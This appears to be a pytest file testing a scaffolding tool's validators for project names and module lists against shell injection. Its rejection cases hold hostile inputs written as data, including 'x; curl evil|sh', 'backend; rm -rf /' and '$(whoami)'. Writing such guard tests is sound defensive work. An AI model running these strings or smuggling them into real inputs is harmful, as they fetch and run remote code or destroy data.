"""Tests for scaffold input validation (shell-injection guard)."""

import pytest

from src.validation import ScaffoldInputError, validate_modules, validate_project_name


class TestValidateProjectName:
    @pytest.mark.parametrize("name", ["my-project", "app", "a", "svc-1", "x2y"])
    def test_accepts_valid(self, name):
        validate_project_name(name)  # no raise

    @pytest.mark.parametrize(
        "name",
        [
            "",
            "1abc",  # starts with digit
            "-abc",  # starts with hyphen
            "My-Project",  # uppercase
            "a b",  # space
            "a;b",  # command separator
            "x; curl evil|sh",
            "a$(whoami)",
            "a`id`",
            "a&&b",
            "a/b",
        ],
    )
    def test_rejects_invalid(self, name):
        with pytest.raises(ScaffoldInputError):
            validate_project_name(name)


class TestValidateModules:
    @pytest.mark.parametrize("modules", ["", "backend", "backend,tg_bot", "a,b,c-d"])
    def test_accepts_valid(self, modules):
        validate_modules(modules)  # no raise

    @pytest.mark.parametrize(
        "modules",
        [
            "x; curl evil|sh",
            "backend; rm -rf /",
            "backend,tg_bot;id",
            "a b",
            "a,,b",  # empty token
            "$(whoami)",
            "a|b",
            "Backend",  # uppercase
        ],
    )
    def test_rejects_invalid(self, modules):
        with pytest.raises(ScaffoldInputError):
            validate_modules(modules)
